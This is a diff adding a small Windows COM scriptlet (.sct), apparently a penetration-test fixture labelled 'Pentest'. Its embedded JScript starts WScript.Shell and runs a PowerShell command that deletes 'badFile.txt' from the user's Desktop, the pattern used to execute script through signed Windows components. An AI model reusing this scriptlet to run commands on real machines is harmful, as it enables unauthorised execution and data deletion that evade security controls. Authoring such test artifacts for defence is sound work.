@@ -1,0 +1,14 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration         
+progid="Pentest"       
+classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+<script language="JScript">
+ 
+<![CDATA[   
+var r = new ActiveXObject("WScript.Shell").Run("powershell -command Remove-Item -path (join-path ([environment]::GetFolderPath('Desktop')) 'badFile.txt')"); 
+]]>
+ 
+</script>
+</registration>
+</scriptlet>
